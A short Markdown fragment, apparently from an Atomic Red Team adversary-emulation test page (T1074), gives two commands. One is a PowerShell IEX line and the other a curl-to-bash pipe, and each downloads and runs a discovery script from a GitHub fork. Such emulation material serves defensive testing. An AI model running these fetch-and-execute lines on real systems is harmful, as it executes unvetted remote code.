...
```
"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cvt111/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > c:\windows\pi.log
```
<br/>
<br/>
...
#### Run it with `bash`!
```
curl -s https://raw.githubusercontent.com/cvt111/atomic-red-team/master/atomics/T1074/Discovery.sh | bash -s > /tmp/discovery.log
```
<br/>
